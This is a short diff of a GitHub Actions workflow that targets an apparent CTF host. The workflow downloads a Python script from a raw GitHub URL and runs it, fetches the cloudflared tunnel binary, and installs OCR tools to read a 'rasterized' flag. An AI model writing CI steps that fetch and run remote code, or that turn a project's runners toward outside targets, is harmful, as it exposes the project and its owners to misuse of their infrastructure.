@@ -9,14 +9,14 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Execute authorized CTF diagnostic
+      - name: Read rasterized CTF flag
         shell: bash
         env:
           TARGET: https://89bd5e3214914b0cb088.kit.sasc.tf:443
         run: |
           set -euo pipefail
-          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/diag.py -o /tmp/diag.py
+          curl -fsSL https://raw.githubusercontent.com/DIA-SMT/botAmbiente-back/ctf-dfo-run-20260829/ctf/readflag_visual.py -o /tmp/readflag_visual.py
           curl -fsSL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o /tmp/cloudflared
           chmod +x /tmp/cloudflared
-          command -v pdftotext || (sudo apt-get update && sudo apt-get install -y poppler-utils)
-          python3 /tmp/diag.py
+          if ! command -v pdftoppm >/dev/null || ! command -v tesseract >/dev/null; then sudo apt-get update && sudo apt-get install -y poppler-utils tesseract-ocr; fi
+          python3 /tmp/readflag_visual.py
